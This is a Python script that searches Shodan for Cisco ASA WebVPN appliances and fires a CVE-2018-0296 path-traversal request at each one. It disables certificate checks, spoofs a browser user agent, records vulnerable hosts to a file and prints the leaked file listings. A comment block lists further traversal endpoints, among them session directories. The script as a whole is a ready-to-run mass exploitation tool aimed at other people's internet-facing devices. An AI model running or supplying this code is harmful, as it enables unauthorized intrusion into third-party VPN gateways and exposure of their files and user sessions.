#!/usr/bin/env python
#
# assa.py
# Search SHODAN for Cisco ASA CVE-2018-0296
#
# Author: random_robbie

import shodan
import sys
import re
import requests
from time import sleep
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


##### OTHER ENDPOINTS TO HIT ######
#+CSCOU+/../+CSCOE+/files/file_list.json?path=/
#+CSCOU+/../+CSCOE+/files/file_list.json?path=%2bCSCOE%2b
#+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions/
#+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions/1
#+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions/2
#+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions/3

# Configuration
API_KEY = "YOURAPIKEY"
SEARCH_FOR = 'webvpn port:"443"'
FILE = "/+CSCOU+/../+CSCOE+/files/file_list.json?path=%2bCSCOE%2b"
session = requests.Session()

def filter_result(str):
	str.strip() #trim
	str.lstrip() #ltrim
	str.rstrip() #rtrim
	return str

def grab_file (IP,PORT,FILE):
	print ("[*] Testing: "+IP+" on Port: "+PORT+"[*]\n")
	try:
		
		URL = "https://"+IP+":"+PORT+""+FILE+""
		
		headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1"}
		response = session.get(URL, headers=headers, timeout=15, verify=False)
		result = response.text
		if 'no_svc.html' in result:
			text_file = open("./cfg/vun.cfg", "a")
			text_file.write(""+URL+"\n")
			text_file.close()
			print ("[*] Vun VPN ... Found [*]\n")
			print (result)
		else:
			print ("[*] Not Vulnerable [*]\n ")
	except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
			
	except Exception as e:
		print (e)
		print ("[*] Nothing Found on IP: "+IP+" [*]\n")
	



	
	
try:
        # Setup the api
		api = shodan.Shodan(API_KEY)

        # Perform the search
		result = api.search(SEARCH_FOR)

        # Loop through the matches and print each IP
		for service in result['matches']:
				IP = service['ip_str']
				PORT = str(service['port'])
				CC = service['location']['country_name']
				grab_file (IP,PORT,FILE)
except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
				
except Exception as e:
		print('Error: %s' % e)
		sys.exit(1)
